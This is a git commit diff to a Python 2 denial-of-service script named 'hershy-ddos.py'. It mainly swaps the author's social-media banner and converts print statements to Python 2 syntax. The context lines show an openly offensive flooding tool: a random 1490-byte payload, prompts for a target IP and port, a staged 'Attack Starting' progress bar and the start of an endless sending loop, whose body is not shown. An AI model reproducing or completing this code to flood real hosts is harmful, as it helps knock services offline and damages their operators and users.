67941122876eec44723a6c270bc782de15925062
Kak.scot <66765981+KAKsaro@users.noreply.github.com>
2020-07-08 11:16:54 +0300

    Update hershy-ddos.py
    By saro

--- hershy-ddos.py
+++ hershy-ddos.py
@@ -18,26 +18,27 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet KAK saro")
-print 
-print ("instagram : kak.saro")
-print ("telegram  : kak_saro")
+os.system("figlet DDos Attack")
 print
+print "Author   : HA-MRX"
+print "You Tube : https://www.youtube.com/c/HA-MRX"
+print "github   : https://github.com/Ha3MrX"
+print "Facebook : https://www.facebook.com/muhamad.jabar222"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print ("[                    ] 0% ")
+print "[                    ] 0% "
 time.sleep(5)
-print ("[=====               ] 25%")
+print "[=====               ] 25%"
 time.sleep(5)
-print ("[==========          ] 50%")
+print "[==========          ] 50%"
 time.sleep(5)
-print ("[===============     ] 75%")
+print "[===============     ] 75%"
 time.sleep(5)
-print ("[====================] 100%")
+print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
